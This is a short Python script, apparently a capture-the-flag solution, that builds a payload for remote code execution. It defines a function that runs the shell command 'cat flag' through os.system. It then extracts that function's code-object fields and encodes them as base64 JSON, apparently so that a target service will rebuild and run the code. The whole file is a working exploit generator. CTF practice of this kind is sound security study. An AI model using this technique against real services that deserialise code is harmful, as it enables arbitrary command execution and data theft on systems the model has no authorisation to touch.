
'''
code(argcount, posonlyargcount, kwonlyargcount, nlocals, stacksize,
 |        flags, codestring, constants, names, varnames, filename, name,
 |        firstlineno, lnotab[, freevars[, cellvars]])


Create a code object.  Not for the faint of heart.
'''

def f(sheet):
    #res = 0
    #for x in sheet.grid[0]:
    #    res += int(x.eval(sheet))
    #return str(res)
    import os
    os.system("cat flag")

c = f.__code__

print(dir(c))

print()
print(c)
print()
print("argcount", type(c.co_argcount), c.co_argcount)
print("posonlyargcount", type(c.co_posonlyargcount), c.co_posonlyargcount)
print("kwonlyargcount", type(c.co_kwonlyargcount), c.co_kwonlyargcount)
print("nlocals", type(c.co_nlocals), c.co_nlocals)
print("stacksize", type(c.co_stacksize), c.co_stacksize)
print("flags", type(c.co_flags), c.co_flags)
print("codestring", type(c.co_code), c.co_code)
print("constants", type(c.co_consts), c.co_consts)
print("names", type(c.co_names), c.co_names)
print("varnames", type(c.co_varnames), c.co_varnames)
print("filename", type(c.co_filename), c.co_filename)
print("name", type(c.co_name), c.co_name)
print("firstlineno", type(c.co_firstlineno), c.co_firstlineno)
print("lnotab", type(c.co_lnotab), c.co_lnotab)

print("freevars", type(c.co_freevars), c.co_freevars)
print("cellvars", type(c.co_cellvars), c.co_cellvars)

import json, base64

x = [c.co_argcount, c.co_posonlyargcount, c.co_kwonlyargcount, c.co_nlocals, c.co_stacksize, c.co_flags, base64.b64encode(c.co_code).decode(), c.co_consts, c.co_names, c.co_varnames, c.co_filename, c.co_name, c.co_firstlineno, base64.b64encode(c.co_lnotab).decode()]
print(x)
x = base64.b64encode(json.dumps(x).encode())

print(x)
